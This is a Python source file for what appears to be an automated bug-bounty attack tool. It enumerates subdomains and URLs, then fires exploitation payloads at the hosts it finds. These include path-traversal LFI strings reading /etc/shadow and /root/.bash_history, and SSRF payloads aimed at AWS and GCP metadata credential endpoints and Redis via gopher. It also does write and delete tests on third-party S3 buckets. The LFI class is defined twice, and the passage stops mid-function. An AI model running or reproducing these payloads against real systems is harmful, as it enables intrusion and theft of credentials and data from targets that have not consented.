import argparse
import json
import os
import subprocess
import time
from datetime import datetime as date
import logging
import logging_config
import requests
import boto3
from botocore.exceptions import ClientError
from tqdm import tqdm
import dns.resolver
import yaml

# Import the logger
logger = logging.getLogger("Falcon")


class Colors:
    """Class to define ANSI color codes for terminal output"""

    def __init__(self):
        """Initialize color codes"""
        self.GREEN = "\033[32m"
        self.RED = "\033[31m"
        self.BLUE = "\033[34m"
        self.SKY_BLUE = "\033[38;5;153m"
        self.END = "\033[0m"


color = Colors()

# Banner for the script, displayed at the start
banner = rf"""{color.GREEN}
    ______      __                      __  __            __
   / ____/___ _/ /________  ____  ___  / / / /_  ______  / /____  _____
  / /_  / __ `/ / ___/ __ \/ __ \/ _ \/ /_/ / / / / __ \/ __/ _ \/ ___/
 / __/ / /_/ / / /__/ /_/ / / / /  __/ __  / /_/ / / / / /_/  __/ /
/_/    \__,_/_/\___/\____/_/ /_/\___/_/ /_/\__,_/_/ /_/\__/\___/_/
                                                            Coder: OctaYus0x01
                                                            https://github.com/octayus
                                                                                            {color.END}
"""

print(banner)


def loading_animation(task):
    """
    Decorator to display a loading animation while a function executes

    Args:
        task (str): Description of the task being performed

    Returns:
        function: Decorated function with loading animation
    """

    def decorator(func):
        def wrapper(*args, **kwargs):
            with tqdm(
                total=100,
                desc=task,
                bar_format="{l_bar}{bar} | {n_fmt}/{total_fmt} [{elapsed}]",
            ) as pbar:
                for _ in range(100):
                    time.sleep(0.02)  # Simulating task progress
                    pbar.update(1)
                result = func(*args, **kwargs)
            return result

        return wrapper

    return decorator


class MakeDirectories:
    """Class to handle directory creation for scan results"""

    def __init__(self, output_file):
        """
        Initialize with output directory path

        Args:
            output_file (str): Path to output directory
        """
        self.output_file = output_file

    @loading_animation(f"{color.GREEN}[+] Creating directories{color.END}")
    def mk_dirs(self):
        """Create directory structure for scan results"""
        try:
            # Validate output_file
            if not self.output_file:
                logger.error(
                    f"{color.RED}Error: Output directory not specified. Please provide an output directory with -o or --output.{color.END}"
                )
                return

            # Create the main output directory
            if not os.path.isdir(self.output_file):  # True
                os.makedirs(self.output_file)
            dirs_list = ["hosts", "urls", "js", "vuln"]

            # Create subdirectories
            for d in dirs_list:
                os.makedirs(os.path.join(self.output_file, d), exist_ok=True)
                time.sleep(0.02)
                logger.info(
                    f"{color.GREEN}[+] {d} Directory successfully created{color.END}"
                )

            logger.info(f"\n{color.SKY_BLUE}{'=' * 40}{color.END}\n")

            # Create files in the 'hosts' directory
            hosts_files = [
                "alive-hosts.txt",
                "httpx.txt",
                "subs.txt",
                "https-alive.txt",
                "asn.txt",
                "cnames.txt",
            ]
            for f in hosts_files:
                open(os.path.join(f"{self.output_file}/hosts/", f), "w").close()
                time.sleep(0.02)
                logger.info(
                    f"{color.SKY_BLUE}[+] {f} File successfully created{color.END}"
                )

            # Create files in the 'urls' directory
            urls_files = [
                "all-urls.txt",
                "filtered-urls.txt",
                "js-files.txt",
                "leaked-docs.txt",
                "params.txt",
                "gf-xss.txt",
                "gf-ssrf.txt",
                "gf-lfi.txt",
                "gf-ssrf.txt",
                "gf-ssti.txt",
                "gf-sqli.txt",
            ]
            for u in urls_files:
                open(os.path.join(f"{self.output_file}/urls/", u), "w").close()
                time.sleep(0.02)
                logger.info(
                    f"{color.SKY_BLUE}[+] {u} File successfully created{color.END}"
                )

            # Create files in the 'vuln' directory
            vuln_files = [
                "nuclei-output.txt",
                "nuclei-dast-output.txt",
                "xss.txt",
                "lfi.txt",
                "ssrf.txt",
                "sqli.txt",
                "ssti.txt",
                "js-findings.txt",
                "missing-dmarc.json",
                "origin-ips.json",
                "s3-buckets.json",
                "ips.txt",
                "alive-ips.txt",
                "xss_output.txt",
                "takeovers.json",
                "mantra.txt",
                "expanded-ips.txt",
                "subzy.txt",
                "subjack.txt",
                "open_redirect.txt",
                "lfi-map.txt",
                "openredirex.txt",
                "aws_vuln_bucket.txt",
                "clickjacking.txt",
                "lfi-urls.txt",
                "lfi-subs.txt",
                "semgrep-findings.json",
            ]
            for v in vuln_files:
                open(os.path.join(f"{self.output_file}/vuln/", v), "w").close()
                time.sleep(0.02)
                logger.info(
                    f"{color.SKY_BLUE}[+] {v} File successfully created{color.END}"
                )

        except Exception as e:
            logger.exception(f"{color.RED}Error creating directories: {e}{color.END}")


class SubdomainsCollector:
    """Class to collect and probe subdomains"""

    def __init__(self, domains, output_file):
        """
        Initialize with domains file and output directory

        Args:
            domains (str): Path to file containing target domains
            output_file (str): Path to output directory
        """
        self.domains = domains
        self.output_file = output_file

    def subfinder_subs(self):
        """Use subfinder to enumerate subdomains"""
        domains = self.domains
        output = f"{self.output_file}/hosts/subs.txt"
        try:
            if os.path.isfile(output):
                subfinder_cmd = ["subfinder", "-dL", domains, "-all", "-o", output]
                logger.info(f"{color.GREEN}(+) Subdomain enumeration{color.END}")
                subprocess.run(subfinder_cmd)
        except Exception as e:
            logger.exception(f"{color.RED}Error occurred: {e}{color.END}")

    def probe(self):
        """Probe subdomains to check which are alive using httpx"""
        subdomains_file = f"{self.output_file}/hosts/subs.txt"
        httpx_output = f"{self.output_file}/hosts/httpx.txt"
        alive_output = f"{self.output_file}/hosts/alive-hosts.txt"
        try:
            httpx_cmd = [
                "httpx",
                "-l",
                subdomains_file,
                "-sc",
                "-title",
                "-fr",
                "-o",
                httpx_output,
            ]
            awk = "'{print $1}'"
            logger.info(f"{color.GREEN}(+) Probing alive hosts{color.END}")
            subprocess.run(httpx_cmd)
            subprocess.run(
                f"cat {httpx_output} | awk {awk} | tee -a {alive_output}",
                check=True,
                shell=True,
            )

        except Exception as e:
            logger.exception(f"{color.RED}Error occurred: {e}{color.END}")


class DmarcFinder:
    """Class to check for DMARC and SPF records"""

    def __init__(self, domains, output_file):
        """
        Initialize with domains file and output directory

        Args:
            domains (str): Path to file containing target domains
            output_file (str): Path to output directory
        """
        self.domains = domains
        self.output_file = output_file

    def check_spf(self, domain):
        """
        Check if SPF record exists for a domain

        Args:
            domain (str): Domain to check

        Returns:
            bool: True if SPF record exists, False otherwise
        """
        try:
            answers = dns.resolver.resolve(domain, "TXT")
            for record in answers:
                if record.to_text().startswith('"v=spf1'):
                    return True
            return False
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
            return False
        except Exception as e:
            logger.exception(f"Error checking SPF for {domain}: {e}")
            return False

    def check_dmarc(self, domain):
        """
        Check if DMARC record exists for a domain

        Args:
            domain (str): Domain to check

        Returns:
            bool: True if DMARC record exists, False otherwise
        """
        try:
            answers = dns.resolver.resolve(f"_dmarc.{domain}", "TXT")
            for record in answers:
                if record.to_text().startswith('"v=DMARC1'):
                    return True
            return False
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
            return False
        except Exception as e:
            logger.exception(f"Error checking DMARC for {domain}: {e}")
            return False

    def validate_domains(self):
        """Validate DMARC and SPF records for all domains in the input file"""
        logger.info(f"{color.GREEN}(+) Checking for DMARC, SPF records{color.END}")
        try:
            with open(self.domains, "r") as file:
                domains_list = file.read().splitlines()

            results = []
            for domain in tqdm(domains_list, desc="Checking DMARC/SPF"):
                spf_valid = self.check_spf(domain)
                dmarc_valid = self.check_dmarc(domain)

                result = {
                    "domain": domain,
                    "spf_valid": spf_valid,
                    "dmarc_valid": dmarc_valid,
                    "status": "Valid" if spf_valid and dmarc_valid else "Vulnerable",
                }
                results.append(result)

            output_json = f"{self.output_file}/vuln/missing-dmarc.json"
            with open(output_json, "w") as f_out:
                json.dump(results, f_out, indent=4)

            logger.info(
                f"{color.GREEN}[+] DMARC and SPF check completed and results saved to {output_json}{color.END}"
            )
            logger.info(f"\n{color.SKY_BLUE}{'=' * 40}{color.END}\n")

        except Exception as e:
            logger.exception(
                f"{color.RED}Error in validate_domains method: {e}{color.END}"
            )


class SubdomainTakeOver:
    """Class to check for potential subdomain takeovers"""

    def __init__(self, domains, output_file):
        """
        Initialize with domains file and output directory

        Args:
            domains (str): Path to file containing target domains
            output_file (str): Path to output directory
        """
        self.domains = domains
        self.output_file = output_file

    def get_cname(self):
        """Get CNAME records for all subdomains"""
        logger.info(
            f"{color.GREEN}(+) CNAME analysis for possible takeovers{color.END}"
        )
        output = f"{self.output_file}/hosts/cnames.txt"
        subdomains_file = f"{self.output_file}/hosts/subs.txt"

        try:
            with open(subdomains_file, "r") as file:
                subdomains = file.read().splitlines()

            with open(output, "w") as out_file:
                for subdomain in subdomains:
                    try:
                        answers = dns.resolver.resolve(subdomain, "CNAME")
                        for cname_data in answers:
                            cname = cname_data.target.to_text()
                            out_file.write(f"{subdomain} > {cname}\n")
                            logger.info(
                                f"{color.GREEN}{subdomain} > {cname}{color.END}\n"
                            )
                    except dns.resolver.NoAnswer:
                        logger.info(
                            f"{color.RED}No CNAME record found for {subdomain}{color.END}\n"
                        )
                    except dns.resolver.NXDOMAIN:
                        logger.warning(
                            f"{color.SKY_BLUE}{subdomain} does not exist{color.END}\n"
                        )
                    except Exception as e:
                        logger.error(
                            f"{color.RED}Error checking CNAME for {subdomain}: {e}{color.END}\n"
                        )

        except Exception as e:
            logger.exception(
                f"{color.RED}Error reading subdomains file: {e}{color.END}"
            )


class BucketFinder:
    """Class to find and test S3 buckets for misconfigurations"""

    def __init__(self, domains, output_file):
        """
        Initialize with domains file and output directory

        Args:
            domains (str): Path to file containing target domains
            output_file (str): Path to output directory
        """
        self.domains = domains
        self.output_file = output_file
        self.vulnerable_buckets = []
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "S3Scanner/1.0"})

        logger.info(f"{color.GREEN}Initialising BucketFinder...{color.END}")

        try:
            self.s3_client = boto3.client("s3")
            self.boto3_available = True
            logger.info(
                f"{color.GREEN}boto3 client initialised successfully{color.END}"
            )
        except Exception as e:
            self.boto3_available = False
            logger.warning(f"{color.RED}boto3 initialisation failed: {e}{color.END}")

    def buckets_cli(self):
        """Main method to extract AWS CNAMEs and test buckets"""
        try:
            cnames_file = f"{self.output_file}/hosts/cnames.txt"
            aws_cnames_output = f"{self.output_file}/hosts/aws_cnames.txt"

            logger.info(f"{color.SKY_BLUE}Reading CNAMEs from {cnames_file}{color.END}")

            with open(cnames_file, "r") as infile, open(
                aws_cnames_output, "w"
            ) as outfile:
                for line in infile:
                    parts = line.strip().split()
                    if len(parts) >= 3 and "s3" in parts[2] and "amazonaws" in parts[2]:
                        bucket = parts[2].strip(".")
                        outfile.write(bucket + "\n")
                        logger.debug(
                            f"{color.BLUE}Found AWS CNAME: {bucket}{color.END}"
                        )

            logger.info(
                f"{color.SKY_BLUE}Starting to test bucket permissions...{color.END}"
            )
            self.test_bucket_permissions(aws_cnames_output)

        except Exception as e:
            logger.exception(f"{color.RED}Error in buckets_cli: {e}{color.END}")

    def test_bucket_permissions(self, aws_cnames_file):
        """Test S3 buckets using HTTP and optionally boto3"""
        try:
            vuln_txt_path = f"{self.output_file}/vuln/aws_vuln_buckets.txt"
            json_output_path = f"{self.output_file}/vuln/s3-buckets.json"

            logger.info(
                f"{color.SKY_BLUE}Testing bucket permissions listed in {aws_cnames_file}{color.END}"
            )

            with open(aws_cnames_file, "r") as f, open(vuln_txt_path, "w") as vuln_file:
                for line in f:
                    bucket_url = line.strip()
                    if not bucket_url:
                        continue

                    bucket_name = bucket_url.split(".")[0]
                    logger.debug(
                        f"{color.BLUE}Testing bucket: {bucket_name}{color.END}"
                    )

                    result = self.test_single_bucket(bucket_name, bucket_url)

                    if result["vulnerable"]:
                        vuln_types = [k for k, v in result["permissions"].items() if v]
                        msg = f"{color.RED}[+] {bucket_url} -> VULNERABLE -> {', '.join(vuln_types)}{color.END}"
                        logger.warning(msg)
                    else:
                        msg = f"{color.GREEN}[-] {bucket_url} -> Secure{color.END}"
                        logger.info(msg)

                    vuln_file.write(msg + "\n")
                    self.vulnerable_buckets.append(result)

            with open(json_output_path, "w") as json_file:
                json.dump(self.vulnerable_buckets, json_file, indent=2)
                logger.info(
                    f"{color.GREEN}Saved JSON results to {json_output_path}{color.END}"
                )

        except Exception as e:
            logger.exception(
                f"{color.RED}Error testing bucket permissions: {e}{color.END}"
            )

    def test_single_bucket(self, bucket_name, bucket_url):
        """Test permissions for a single bucket"""
        permissions = {
            "listable": False,
            "readable": False,
            "writable": False,
            "deletable": False,
        }

        # HTTP checks
        try:
            r = self.session.get(f"http://{bucket_url}", timeout=10)
            if r.status_code == 200:
                if "<ListBucketResult" in r.text:
                    permissions["listable"] = True
                else:
                    permissions["readable"] = True
        except requests.RequestException as e:
            logger.debug(f"{color.RED}HTTP GET failed for {bucket_url}: {e}{color.END}")

        # HTTP write/delete test
        test_file = f"test_{bucket_name}.txt"
        test_put_url = f"http://{bucket_name}.s3.amazonaws.com/{test_file}"
        try:
            put_resp = self.session.put(test_put_url, data="test", timeout=10)
            if put_resp.status_code in [200, 201]:
                permissions["writable"] = True
                try:
                    del_resp = self.session.delete(test_put_url, timeout=5)
                    if del_resp.status_code == 204:
                        permissions["deletable"] = True
                except requests.RequestException:
                    pass
        except requests.RequestException as e:
            logger.debug(
                f"{color.RED}HTTP PUT/DELETE failed for {bucket_name}: {e}{color.END}"
            )

        # boto3 checks if available
        if self.boto3_available:
            try:
                self.s3_client.list_objects_v2(Bucket=bucket_name, MaxKeys=1)
                permissions["listable"] = True
            except ClientError as e:
                logger.debug(
                    f"{color.RED}boto3 list_objects_v2 failed for {bucket_name}: {e}{color.END}"
                )

            try:
                test_key = f"boto3_test_{bucket_name}.txt"
                self.s3_client.put_object(Bucket=bucket_name, Key=test_key, Body="test")
                permissions["writable"] = True
                try:
                    self.s3_client.delete_object(Bucket=bucket_name, Key=test_key)
                    permissions["deletable"] = True
                except ClientError as e:
                    logger.debug(
                        f"{color.RED}boto3 delete_object failed for {bucket_name}: {e}{color.END}"
                    )
            except ClientError as e:
                logger.debug(
                    f"{color.RED}boto3 put_object failed for {bucket_name}: {e}{color.END}"
                )

        return {
            "bucket_name": bucket_name,
            "bucket_url": bucket_url,
            "permissions": permissions,
            "vulnerable": any(permissions.values()),
            "tested_with": "boto3+http" if self.boto3_available else "http-only",
        }


class UrlFinder:
    """Class to find and analyze URLs from target domains"""

    def __init__(self, domains, output_file):
        """
        Initialize with domains file and output directory

        Args:
            domains (str): Path to file containing target domains
            output_file (str): Path to output directory
        """
        self.domains = domains
        self.output_file = output_file
        self.js_output = f"{self.output_file}/urls/js-files.txt"
        self.leaked_docs = f"{self.output_file}/urls/leaked-docs.txt"
        self.mantra_output = f"{self.output_file}/urls/mantra-output.txt"
        self.js_findings = f"{self.output_file}/urls/js-findings.txt"

    def collect_urls(self):
        """Collect URLs from various sources (wayback, gau, etc)"""
        subdomains_file = f"{self.output_file}/hosts/subs.txt"
        urls = f"{self.output_file}/urls/all-urls.txt"

        try:
            logger.info(f"{color.GREEN}(+) Collecting all URLs{color.END}")
            commands = [
                f"cat {subdomains_file} | waybackurls | anew {urls}",
                f"cat {subdomains_file} | gau --subs | anew {urls}",
                f"cat {subdomains_file} | gauplus | anew {urls}",
                f"cat {urls} | grep '\\.js$' | anew {self.js_output}",
            ]
            for cmd in commands:
                subprocess.run(cmd, shell=True, check=True)
            gf_list = ["xss", "ssrf", "lfi", "sqli", "ssti"]
            gf_output = f"{self.output_file}/urls/"
            for gf in gf_list:
                subprocess.run(
                    f"cat {urls} | gf {gf} | anew {gf_output}gf-{gf}.txt",
                    shell=True,
                    check=True,
                )

        except Exception as e:
            logger.exception(
                f"{color.RED}Error occurred during URL collection: {e}{color.END}"
            )

    def extract_js_files(self):
        """Extract JavaScript files from collected URLs"""
        try:
            logger.info(f"{color.GREEN}[+] Extracting JS files...{color.END}")
            js_command = f"grep '\\.js$' {self.js_output} | anew {self.js_output}"
            subprocess.run(js_command, shell=True, check=True)
            logger.info(
                f"{color.GREEN}[+] Completed: JS files saved to {self.js_output}{color.END}"
            )
        except Exception as e:
            logger.exception(f"{color.RED}Error occurred: {e}{color.END}")

    def extract_documents(self):
        """Extract document and backup files from collected URLs"""
        try:
            logger.info(
                f"{color.GREEN}[+] Extracting documents and backup files...{color.END}"
            )
            doc_file_types = r"\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar"
            doc_command = f"grep -E '{doc_file_types}' {self.output_file}/urls/all-urls.txt | anew {self.leaked_docs}"
            subprocess.run(doc_command, shell=True, check=True)
            logger.info(
                f"{color.GREEN}[+] Completed: Sensitive documents saved to {self.leaked_docs}{color.END}"
            )
        except Exception as e:
            logger.exception(f"{color.RED}Error occurred: {e}{color.END}")

    def download_and_scan_js(self):
        """Download JavaScript files and scan them with Semgrep"""
        js_dir = f"{self.output_file}/js/"
        os.makedirs(js_dir, exist_ok=True)
        try:
            logger.info(f"{color.GREEN}[+] Downloading JavaScript files...{color.END}")
            with open(self.js_output, "r") as file:
                urls = file.read().splitlines()
            downloaded_files = []
            for url in urls:
                try:
                    response = requests.get(url)
                    if response.status_code == 200:
                        filename = os.path.join(
                            js_dir, os.path.basename(url.split("?")[0])
                        )
                        with open(filename, "wb") as js_file:
                            js_file.write(response.content)
                        downloaded_files.append(filename)
                        logger.info(f"{color.GREEN}[+] Downloaded: {url}{color.END}")
                    else:
                        logger.exception(
                            f"{color.RED}[-] Failed to download: {url} (Status {response.status_code}){color.END}"
                        )
                except requests.exceptions.RequestException as e:
                    logger.exception(
                        f"{color.RED}[-] Error downloading {url}: {e}{color.END}"
                    )
            # If no files were downloaded, skip Semgrep
            if not downloaded_files:
                logger.info(
                    f"{color.RED}[-] No JavaScript files were downloaded. Skipping Semgrep.{color.END}"
                )
                return
            logger.info(
                f"{color.GREEN}[+] Running Semgrep on downloaded JS files...{color.END}"
            )
            semgrep_command = f"semgrep --config=p/javascript --json --output {self.output_file}/vuln/semgrep-findings.json {js_dir}"
            subprocess.run(semgrep_command, shell=True, check=True)
            logger.info(
                f"{color.GREEN}[+] Completed: Semgrep findings saved to {self.output_file}/vuln/semgrep-findings.json{color.END}"
            )
        except Exception as e:
            logger.exception(f"{color.RED}Error occurred: {e}{color.END}")

    def extract_js_data_with_mantra(self):
        """Extract data from JavaScript files using Mantra"""
        try:
            logger.info(
                f"{color.GREEN}[+] Extracting data from JS files using Mantra...{color.END}"
            )
            mantra_command = (
                f"cat {self.js_output} | mantra | anew {self.mantra_output}"
            )
            subprocess.run(mantra_command, shell=True, check=True)

            findings_command = (
                f"cat {self.mantra_output} | grep '[+]' | anew {self.js_findings}"
            )
            subprocess.run(findings_command, shell=True, check=True)
            logger.info(
                f"{color.GREEN}[+] Completed: Mantra JS findings saved to {self.js_findings}{color.END}"
            )
        except Exception as e:
            logger.exception(f"{color.RED}Error occurred: {e}{color.END}")


class LFI:
    def __init__(self, domains, output_file):
        """
        Initialize with domains file and output directory

        Args:
            domains (str): Path to file containing target domains
            output_file (str): Path to output directory
        """
        self.domains = domains
        self.output_file = output_file


class LFI:
    def __init__(self, domains, output_file):
        self.domains = domains
        self.output_file = output_file
        self.session = requests.Session()
        self.session.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
        }
        self.tested_urls = set()

    def _generate_payloads(self):
        base_files = [
            "/etc/passwd",
            "/etc/shadow",
            "/proc/self/environ",
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "/var/www/html/config.php",
            "/root/.bash_history",
            "/home/*/.bash_history",
            "C:\\Windows\\win.ini",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
        ]
        traversal_patterns = [
            "../" * 8,
            "..%2f" * 8,
            "..%252f" * 8,
            "..%c0%af" * 8,
            "..\\" * 8,
            "%2e%2e/" * 8,
            "....//" * 8,
        ]
        null_bytes = ["", "%00", "%2500", ".jpg"]
        payloads = []
        for file in base_files:
            for traversal in traversal_patterns:
                for null in null_bytes:
                    payloads.append(f"{traversal}{file}{null}")
        return payloads

    def _is_vulnerable(self, response):
        indicators = {
            "linux": ["root:x:0:0", "daemon:x:1:1", "bin:x:2:2"],
            "windows": ["; for 16-bit app support", "[fonts]", "[extensions]"],
            "apache": ["Apache access log", "GET / HTTP/1.1"],
            "php": ["<?php", "PHP Version"],
        }
        content = response.text.lower()
        for patterns in indicators.values():
            for pattern in patterns:
                if pattern.lower() in content:
                    return True
        return False

    def deep_scan(self):
        """Detailed LFI scanner with evidence output"""
        try:
            lfi_urls = f"{self.output_file}/urls/gf-lfi.txt"
            output_file = f"{self.output_file}/vuln/confirmed_lfi.json"
            if not os.path.exists(lfi_urls):
                logger.error(f"LFI URLs file not found: {lfi_urls}")
                return False

            payloads = self._generate_payloads()
            results = []
            with open(lfi_urls, "r") as f:
                urls = [line.strip() for line in f if line.strip()]

            for url in urls:
                if url in self.tested_urls:
                    continue
                self.tested_urls.add(url)

                for payload in payloads:
                    if "=" in url:
                        injected = url.replace("=param", f"={payload}")
                        try:
                            resp = self.session.get(injected, timeout=10)
                            if self._is_vulnerable(resp):
                                results.append(
                                    {
                                        "url": url,
                                        "payload": payload,
                                        "status": resp.status_code,
                                        "evidence": resp.text[:200] + "...",
                                    }
                                )
                        except Exception as e:
                            logger.debug(f"Error testing {url}: {e}")

            if results:
                os.makedirs(os.path.dirname(output_file), exist_ok=True)
                with open(output_file, "w") as f:
                    json.dump(results, f, indent=2)
                logger.info(
                    f"{color.GREEN}[+] Found {len(results)} confirmed LFI vulnerabilities{color.END}"
                )
            else:
                logger.info(f"{color.BLUE}[-] No LFI vulnerabilities found{color.END}")

        except Exception as e:
            logger.error(f"{color.RED}Deep scan failed: {e}{color.END}")

    def fast_scan(self):
        """Quick CLI-based scan using httpx + qsreplace"""
        lfi_payloads = [
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../etc/passwd%00",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252Fetc%252Fpasswd",
            "..%c0%af..%c0%afetc%c0%afpasswd",
            "../../../../../proc/self/environ",
            "..%2F..%2F..%2Fwindows%2Fwin.ini",
        ]
        try:
            subs_file = f"{self.output_file}/hosts/alive-hosts.txt"
            urls_file = f"{self.output_file}/urls/gf-lfi.txt"
            output_subs = f"{self.output_file}/vuln/lfi-subs.txt"
            output_urls = f"{self.output_file}/vuln/lfi-urls.txt"

            os.makedirs(os.path.dirname(output_subs), exist_ok=True)

            logger.info(
                f"{color.GREEN}(+) Running fast subdomain LFI scan...{color.END}"
            )
            for payload in lfi_payloads:
                cmd_subs = f"cat {subs_file} | qsreplace '{payload}' | httpx -silent --random-agent -mc 200 -mr 'root:x:0:0:' >> {output_subs}"
                subprocess.run(cmd_subs, shell=True)

            logger.info(f"{color.GREEN}(+) Running fast URL LFI scan...{color.END}")
            for payload in lfi_payloads:
                cmd_urls = f"cat {urls_file} | qsreplace '{payload}' | httpx -silent --random-agent -mc 200 -mr 'root:x:0:0:' >> {output_urls}"
                subprocess.run(cmd_urls, shell=True)

        except Exception as e:
            logger.error(f"{color.RED}Fast scan failed: {e}{color.END}")

    def run_all(self):
        """Run both deep and fast LFI scans"""
        self.fast_scan()
        self.deep_scan()


class SSRF:
    """Class to test for Server-Side Request Forgery vulnerabilities"""

    def __init__(self, domains, output_file):
        """
        Initialize with domains file and output directory

        Args:
            domains (str): Path to file containing target domains
            output_file (str): Path to output directory
        """
        self.domains = domains
        self.output_file = output_file
        self.payloads = self._generate_ssrf_payloads()
        self.interactsh_url = self._get_interactsh_url()

    def _generate_ssrf_payloads(self):
        """Generate comprehensive SSRF test payloads"""
        base_payloads = [
            # Basic SSRF payloads
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost/admin",
            "http://127.0.0.1:8080",
            "http://[::1]/",
            # Cloud metadata endpoints
            "http://169.254.169.254/latest/user-data",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1beta1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata.azure.internal/metadata/instance?api-version=2020-06-01",
            # DNS rebinding payloads
            "http://example.com@127.0.0.1",
            "http://127.0.0.1#@example.com",
            "http://127.0.0.1:80+&@example.com#+@127.0.0.1/",
            # URL encoded payloads
            "http://%6c%6f%63%61%6c%68%6f%73%74",
            "http://%4c%6f%63%61%6c%68%6f%73%74",
            # IPv6 payloads
            "http://[::]",
            "http://[::ffff:127.0.0.1]",
            # Protocol smuggling
            "dict://localhost:6379/info",
            "gopher://localhost:6379/_INFO",
            "ftp://localhost:21",
            "ldap://localhost",
            "tftp://localhost",
            # DNS payloads
            "http://localtest.me",
            "http://subdomain.localhost",
            "http://customer1.app.localhost.127.0.0.1.nip.io",
            # Out-of-band payloads
            "http://{interactsh_url}",
            "http://{interactsh_url}/?test=ssrf",
            "http://{interactsh_url}/ssrf",
            "http://{interactsh_url}/ping",
        ]

        # Add interactsh URL if available
        if hasattr(self, "interactsh_url") and self.interactsh_url:
            return [p.format(interactsh_url=self.interactsh_url) for p in base_payloads]
        return base_payloads

    def _get_interactsh_url(self):
        """Generate an interactsh URL for blind SSRF detection"""
        try:
            logger.info(
                f"{color.GREEN}[+] Generating interactsh URL for blind SSRF detection{color.END}"
            )
            result = subprocess.run(
                "interactsh-client -v -json 2>/dev/null | jq -r '.correlation_id' | head -1",
                shell=True,
                capture_output=True,
                text=True,
                timeout=40,
            )
            if result.returncode == 0 and result.stdout.strip():
                url = result.stdout.strip()
                logger.info(
                    f"{color.GREEN}[+] Monitoring for interactions at: https://{url}{color.END}"
                )
                return url
        except Exception as e:
            logger.error(
                f"{color.RED}[-] Failed to generate interactsh URL: {e}{color.END}"
            )
        return None

    def ssrf_cli(self):
        """Test for SSRF vulnerabilities using comprehensive techniques"""
        try:
            # Prepare file paths
            ssrf_urls = f"{self.output_file}/urls/gf-ssrf.txt"
            ssrf_output = f"{self.output_file}/vuln/ssrf.txt"
            os.makedirs(os.path.dirname(ssrf_output), exist_ok=True)

            # Phase 1: Basic SSRF testing
            logger.info(f"{color.GREEN}[+] Starting basic SSRF tests{color.END}")
            for payload in self.payloads:
                if "{interactsh_url}" in payload and not self.interactsh_url:
                    continue

                logger.debug(f"{color.BLUE}[*] Testing payload: {payload}{color.END}")

                # Use httpx for better detection
                cmd = [
                    "bash",
                    "-c",
                    f"cat {ssrf_urls} | qsreplace '{payload}' | "
                    f"httpx -silent -random-agent -timeout 10 -retries 1 -match-string 'metadata' "
                    f"-mr 'metadata|localhost|127.0.0.1|Internal Server Error' "
                    f"-json | jq -r '.url' | anew {ssrf_output}",
                ]
                subprocess.run(cmd, check=False)

            # Phase 2: Advanced testing with custom tools
            self._advanced_ssrf_tests(ssrf_urls, ssrf_output)

            # Phase 3: Analyze results
            self._analyze_ssrf_results(ssrf_output)

            return True

        except Exception as e:
            logger.exception(f"{color.RED}[-] SSRF test failed: {e}{color.END}")
            return False

    def _advanced_ssrf_tests(self, input_file, output_file):
        """Perform advanced SSRF testing with specialized tools"""
        try:
            logger.info(f"{color.GREEN}[+] Starting advanced SSRF tests{color.END}")

            # Test with Gopherus for protocol smuggling
            if self._check_tool_installed("gopherus"):
                logger.info(
                    f"{color.GREEN}[+] Running Gopherus for protocol smuggling{color.END}"
                )
                cmd = (
                    f"cat {input_file} | qsreplace 'gopher://localhost:6379/_' | "
                    f'xargs -I % -P 10 sh -c \'curl -ksm 5 "%" | grep "redis" && echo "VULN: %"\' | '
                    f"anew {output_file}"
                )
                subprocess.run(cmd, shell=True, check=False)

            # Test with DNS rebinding
            logger.info(f"{color.GREEN}[+] Testing DNS rebinding vectors{color.END}")
            dns_payloads = [
                "http://example.com@127.0.0.1",
                "http://127.0.0.1#@example.com",
                "http://{interactsh_url}",
            ]
            for payload in dns_payloads:
                if "{interactsh_url}" in payload and not self.interactsh_url:
                    continue
                cmd = f"cat {input_file} | qsreplace '{payload}' | httpx -silent -random-agent | anew {output_file}"
                subprocess.run(cmd, shell=True, check=False)

            # Cloud metadata specific tests
            self._test_cloud_metadata(input_file, output_file)

        except Exception as e:
            logger.error(f"{color.RED}[-] Advanced SSRF tests failed: {e}{color.END}")

    def _test_cloud_metadata(self, input_file, output_file):
        """Specialized tests for cloud metadata endpoints"""
        try:
            logger.info(f"{color.GREEN}[+] Testing cloud metadata endpoints{color.END}")

            cloud_payloads = [
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                "http://metadata.azure.internal/metadata/instance?api-version=2020-06-01",
                "http://metadata.cloud.aliyuncs.com/latest/meta-data/",
                "http://100.100.100.200/latest/meta-data/",
            ]

            for payload in cloud_payloads:
                cmd = (
                    f"cat {input_file} | qsreplace '{payload}' | "
                    f"httpx -silent -random-agent -match-string 'iam|token|metadata' "
                    f"-mr 'iam|token|metadata' -json | jq -r '.url' | anew {output_file}"
                )
                subprocess.run(cmd, shell=True, check=False)

        except Exception as e:
            logger.error(f"{color.RED}[-] Cloud metadata tests failed: {e}{color.END}")

    def _analyze_ssrf_results(self, results_file):
        """Analyze and summarize SSRF findings"""
        try:
            if not os.path.exists(results_file):
                logger.warning(f"{color.SKY_BLUE}[!] No SSRF results found{color.END}")
                return

            with open(results_file, "r") as f:
                vuln_urls = f.read().splitlines()

            if not vuln_urls:
                logger.info(f"{color.BLUE}[-] No SSRF vulnerabilities found{color.END}")
                return

            # Categorize findings
            cloud_findings = [
                u for u in vuln_urls if "169.254.169.254" in u or "metadata" in u
            ]
            localhost_findings = [
                u for u in vuln_urls if "localhost" in u or "127.0.0.1" in u
            ]
            protocol_findings = [
                u
                for u in vuln_urls
                if any(p in u for p in ["dict://", "gopher://", "ftp://"])
            ]
            oob_findings = [
                u for u in vuln_urls if self.interactsh_url and self.interactsh_url in u
            ]

